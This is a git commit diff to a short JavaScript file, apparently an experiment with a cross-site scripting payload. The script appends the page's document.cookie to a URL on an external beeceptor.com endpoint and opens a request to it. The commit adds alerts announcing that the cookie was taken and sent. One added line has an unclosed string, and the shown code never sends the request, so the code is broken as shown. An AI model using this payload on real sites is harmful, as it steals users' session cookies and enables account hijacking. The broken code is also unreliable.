bb1c2bb5c8facd803bc3c5d5de62bcac90f4566f
llorave <55631969+llorave@users.noreply.github.com>
2020-02-07 20:49:57 -0500

    Update script2.js

--- script2.js
+++ script2.js
@@ -2,5 +2,9 @@ var url = "https://llorave.free.beeceptor.com/my/api/path?cookie=";
 
 url = url + document.cookie;
 
+alert("magic! your cookie is " + document.cookie);
+
 var xhr = new XMLHttpRequest();
 xhr.open("GET", url, true);
+
+alert("sent the cookie!);
